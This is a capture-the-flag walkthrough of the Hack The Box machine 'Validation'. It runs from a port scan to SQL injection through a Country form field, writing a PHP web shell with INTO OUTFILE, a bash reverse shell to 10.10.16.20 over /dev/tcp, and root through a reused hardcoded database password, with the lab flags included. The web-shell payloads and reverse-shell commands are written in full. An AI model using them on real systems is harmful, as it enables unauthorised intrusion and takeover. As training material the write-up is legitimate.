# Validation
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/34121d99-dd66-480a-a190-40e8a6267294)

## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.11.116 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-14 09:27 PDT
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 86.10% done; ETC: 09:27 (0:00:02 remaining)
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 87.80% done; ETC: 09:27 (0:00:02 remaining)
Nmap scan report for 10.10.11.116
Host is up (0.041s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8f5efd2d3f98dadc6cf24859426ef7a (RSA)
|   256 463d6bcba819eb6ad06886948673e172 (ECDSA)
|_  256 7032d7e377c14acf472adee5087af87a (ED25519)
80/tcp   open     http           Apache httpd 2.4.48 ((Debian))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.48 (Debian)
4566/tcp open     http           nginx
|_http-title: 403 Forbidden
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
5005/tcp filtered avt-profile-2
5006/tcp filtered wsm-server
5007/tcp filtered wsm-server-ssl
5008/tcp filtered synapsis-edge
8080/tcp open     http           nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.37 seconds
```

1. Based from the nmap result, our interest should be the web application and the ssh login. But anyway the only http port I can access is por 80.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/94029c75-dabe-43ca-9867-0bb97c48803d)


2. Intercepting the request in burpsuite, it seems we can change the country name to whatever we want.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e5374d98-bb44-42f2-bc8d-72974bb9a73a)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3873637f-4f76-45f4-a19f-51d8f4e1de8e)


3. Long story short, it's vulnerable to SQLi.

> Change the `Country` parameter to quote (').

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0023927a-4c1b-465b-8595-dac5e49189a5)


4. Great! Now we need to identify how many column that can be returned to us.

> USING ORDER BY

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/27270404-01d2-4156-86fd-d2be2b449ee8)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/038bfe71-1b92-4a2b-8279-82754521dff5)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3f601f06-c93f-4bf0-8184-f4030a378ca8)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0fcf2495-8894-4551-ad8a-741663e392a9)


5. Got error, when sending 2. It means we can only return 1 column.
6. Based from the wappalyzer, we knew that the webapp is using PHP.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/87af3c2f-6aaf-412c-a92f-e3dc9a7d1dd5)


7. Great, sqli vuln in php-based webapp should allows us to drop a webshell.

> PAYLOAD

```txt
' UNION SELECT "<?php SYSTEM($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php'-- -
```

```
┌──(brandy㉿bread-yolk)-[~]
└─$ curl http://validation.htb/shell.php?cmd=id                                                                       
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

8. Great, let's do reverse shell.

> REVSHELL

```
curl http://validation.htb/shell.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.20/1337 0>&1"'
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b4b2a1b3-840d-4374-8e93-5bb3e1353cea)


9. Let's change from **SYSTEM** to **REQUEST**. So send our webshell first, then run the revshell again.

```
' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/shellv2.php'-- -

curl http://validation.htb/shellv2.php --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.16.20/1337 0>&1"'
```

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/89caff78-8b16-486b-a51e-21072e1f527c)


10. Got shell!

> GETTING USER FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4b692f56-cf5e-4d82-a841-a1d3a25ede90)


## USER FLAG

```
51e2c20c4ab36b81abbf2838ec8b3a63
```


11. Obviously we can't check sudo permission. The only thing that should be our interest is the config.php file at /var/www/html

> CONFIG.PHP

```php
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

12. In config.php, we found a hardcoded db password.
13. The interpretation is this .php should mean something to us, what if there's a **password re-use**.
14. To prove that, run `su` and enter the db password.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b0d79fff-29ca-4b74-a6e8-7674d1ea52fb)


15. And we got root..

> GETTING ROOT FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/588cdc68-51e8-4a40-b350-f4ee1aff4d6c)


## ROOT FLAG

```
e9cab8999cf80c96fb793662a56dec55
```
